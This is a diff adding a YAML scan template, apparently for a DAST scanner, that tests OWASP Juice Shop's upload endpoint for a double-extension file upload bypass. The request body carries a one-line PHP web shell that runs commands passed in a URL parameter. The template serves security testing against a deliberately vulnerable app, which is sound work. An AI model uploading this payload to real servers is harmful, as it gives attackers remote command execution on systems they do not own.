@@ -1,0 +1,39 @@
+id: juice-shop-file-upload-bypass
+info:
+  name: Juice Shop File Upload Bypass
+  author: dast-mvp
+  description: Tests for malicious file upload bypass via double extension
+  severity: high
+  tags:
+    - file-upload
+    - rce
+    - juice-shop
+    - owasp
+
+http:
+  - raw:
+      - |
+        POST /api/file-upload HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{bearer_token}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="test.php.txt"
+        Content-Type: text/plain
+
+        <?php system($_GET['cmd']); ?>
+        ------WebKitFormBoundary--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        words:
+          - "upload"
+          - "success"
+        condition: or
+        part: body
